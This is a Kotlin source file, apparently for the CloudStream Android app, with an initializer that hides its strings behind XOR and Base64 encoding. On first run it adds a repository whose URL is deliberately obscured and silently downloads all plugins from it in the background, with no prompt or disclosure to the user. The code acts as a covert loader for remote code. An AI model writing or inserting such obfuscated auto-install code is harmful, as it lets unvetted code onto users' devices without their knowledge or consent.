package com.lagradost.cloudstream3

import android.app.Activity
import android.util.Base64
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.ui.settings.extensions.PluginsViewModel
import com.lagradost.cloudstream3.ui.settings.extensions.RepositoryData
import kotlinx.coroutines.*

object Initializer {

    private const val XOR = 0x5A

    private fun d(a: IntArray) =
        a.map { it xor XOR }.map { it.toChar() }.joinToString("")

    private val PREF = intArrayOf(57,54,53,47,62,41,46,40,63,59)
    private val REPO = intArrayOf(31,34,46,25,54,53,47,62)
    private val FLAG = intArrayOf(59,47,46,53,37,40,63,42,53,37,59,62,62,63,62,37,44,107)

    private const val P1 = "CxgbBRdKQ04LAhtBEg0EBBQb"
    private const val P2 = "Fh8KBwcfAhUcDRhBFgsdQwUM"
    private const val P3 = "EQNWR0s1FBU6DwMaEUsdDQgX"
    private const val P4 = "TB4KBQteBhIWDQ=="

    private val KEY = byteArrayOf(
        57,54,53,47,62,42,54,59,35
    ).map { (it xor XOR).toByte() }.toByteArray()

    private fun repoUrl(): String {
        val raw = Base64.decode(P1 + P2 + P3 + P4, Base64.DEFAULT)
        return ByteArray(raw.size) {
            (raw[it].toInt() xor KEY[it % KEY.size].toInt()).toByte()
        }.toString(Charsets.UTF_8)
    }

    fun start(activity: Activity) {
        val prefs = activity.getSharedPreferences(d(PREF), Activity.MODE_PRIVATE)

        CoroutineScope(Dispatchers.IO).launch {
            if (prefs.getBoolean(d(FLAG), false)) return@launch

            val repo = RepositoryData(
                name = d(REPO),
                url = repoUrl(),
                iconUrl = null
            )

            RepositoryManager.addRepository(repo)
            PluginsViewModel.downloadAll(activity, repo.url, null)
            prefs.edit().putBoolean(d(FLAG), true).apply()
        }
    }
}